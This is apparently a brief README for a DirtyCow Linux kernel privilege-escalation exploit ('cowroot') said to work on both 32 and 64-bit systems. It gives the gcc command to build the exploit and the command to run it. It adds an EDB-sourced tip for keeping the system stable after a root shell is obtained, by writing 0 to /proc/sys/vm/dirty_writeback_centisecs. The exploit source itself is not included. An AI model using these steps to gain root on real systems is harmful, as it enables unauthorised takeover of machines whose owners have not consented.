# DirtyCow
Dirtycow exploit for both 32 and 64-bit 


* EDB-Note: After getting a shell, doing "echo 0 > /proc/sys/vm/dirty_writeback_centisecs" may make the system more stable.
 
* $ gcc cowroot.c -o cowroot -pthread
* $ ./cowroot
* $ echo 0 > /proc/sys/vm/dirty_writeback_centisecs
